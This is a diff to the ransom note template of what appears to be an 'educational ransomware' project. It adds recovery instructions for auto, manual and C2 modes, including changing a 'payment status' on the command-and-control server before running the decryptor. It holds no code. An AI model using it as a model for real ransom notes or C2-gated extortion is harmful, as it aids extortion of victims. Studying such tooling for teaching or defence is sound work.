@@ -1,6 +1,6 @@
 ALERT YOUR SYSTEM HAS BEEN ENCRYPTED BY: educational ransomware
 
-----------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------
 
 To recover your files you must:
 - bla bla bla
@@ -8,4 +8,26 @@ To recover your files you must:
 
 Then you will be able to execute the decryptor
 
-----------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------
+
+
+If your system was encrypted using the auto/manual mode:
+Run the decryptor.py from any folder that has been encrypted
+
+----------------------------------------------------------------------------------------------------------
+
+
+If your system was encrypted using the manual mode you have these options:
+- Run the decryptor.py from any of the folders
+- If you are still executing the main.py you can decrypt your system from there.
+
+----------------------------------------------------------------------------------------------------------
+
+
+If your system was encrypted using the c2 mode, you have these options:
+- If the c2 server is still running, go to the server CLI and change the 
+payment status using the command, then you will be able to execute the decryptor.py
+- If you stopped the c2 server after encypting the system you can still recover the files,
+by modifying the mode at discovered_info.json in the ransomware folder and executing the decryptor.py
+
+----------------------------------------------------------------------------------------------------------
